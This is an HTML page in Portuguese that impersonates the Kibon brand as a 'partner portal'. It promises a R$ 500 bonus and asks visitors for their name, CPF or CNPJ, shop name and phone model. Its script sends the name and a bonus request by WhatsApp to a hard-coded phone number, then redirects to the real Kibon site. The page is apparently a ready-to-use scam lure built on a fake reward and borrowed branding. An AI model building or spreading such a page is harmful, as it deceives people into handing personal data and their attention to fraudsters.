<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kibon - Cadastro Oficial</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --kibon-red: #E2001A;
            --kibon-yellow: #FFD700;
        }

        * { box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
        body { background-color: #f4f4f4; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 15px; }

        .card {
            background: white;
            width: 100%;
            max-width: 480px;
            border-radius: 30px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            overflow: hidden;
            text-align: center;
        }

        .header { padding: 30px 20px 10px; }

        /* ESTILO DA IMAGEM */
        .logo-container {
            min-height: 80px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 15px;
        }

        .logo-kibon {
            width: 180px;
            height: auto;
            display: block;
        }

        /* Caso a imagem falhe, este estilo manterá o aspeto profissional */
        .logo-kibon[alt]:after {
            content: "KIBON";
            display: block;
            font-size: 30px;
            font-weight: 900;
            color: var(--kibon-red);
        }

        .bonus-banner {
            background: var(--kibon-yellow);
            color: var(--kibon-red);
            padding: 12px;
            font-weight: 800;
            font-size: 14px;
            text-transform: uppercase;
        }

        h1 { font-size: 22px; color: var(--kibon-red); margin: 15px 0; font-weight: 800; }

        .form-body { padding: 0 25px 30px; text-align: left; }
        .input-group { margin-bottom: 12px; }
        label { display: block; font-size: 11px; font-weight: 700; color: #666; margin-bottom: 4px; text-transform: uppercase; }
        input {
            width: 100%; padding: 12px; border: 2px solid #f0f0f0; border-radius: 15px;
            font-size: 14px; outline: none; transition: 0.3s;
        }
        input:focus { border-color: var(--kibon-red); }

        .btn-kibon {
            width: 100%; padding: 18px; background: var(--kibon-red); color: white;
            border: none; border-radius: 50px; font-size: 16px; font-weight: 800;
            cursor: pointer; transition: 0.3s; margin-top: 20px;
        }
        .btn-kibon:hover { transform: scale(1.02); background: #c10016; }
    </style>
</head>
<body>

<div class="card">
    <div class="bonus-banner">🎁 BÔNUS DE R$ 500,00 ATIVO</div>
    
    <div class="header">
        <div class="logo-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/63/Kibon_logo.svg/1024px-Kibon_logo.svg.png" 
                 alt="Logo Kibon" 
                 class="logo-kibon"
                 onerror="this.src='https://logodownload.org/wp-content/uploads/2017/05/kibon-logo-1.png'">
        </div>
        <h1>Portal do Parceiro</h1>
    </div>

    <form class="form-body">
        <div class="input-group">
            <label>Nome Completo</label>
            <input type="text" id="nome" placeholder="Seu nome">
        </div>
        <div class="input-group">
            <label>CPF ou CNPJ</label>
            <input type="text" id="doc" placeholder="000.000.000-00">
        </div>
        <div class="input-group">
            <label>Nome do Comércio</label>
            <input type="text" id="loja" placeholder="Nome da Loja">
        </div>
        <div class="input-group">
            <label>Modelo do Celular</label>
            <input type="text" id="cel" placeholder="Ex: iPhone 15">
        </div>

        <button type="button" class="btn-kibon" onclick="enviar()">CADASTRAR E RECEBER</button>
    </form>
</div>

<script>
    function enviar() {
        const tel = "5554999422678";
        const nome = document.getElementById('nome').value;
        const msg = `*CADASTRO KIBON*%0A*Nome:* ${nome}%0A*Solicito bônus de R$ 500*`;
        
        if(!nome) { alert("Preencha os campos!"); return; }

        window.open(`https://api.whatsapp.com/send?phone=${tel}&text=${msg}`, '_blank');
        window.location.href = "https://www.kibon.com.br";
    }
</script>

</body>
</html>
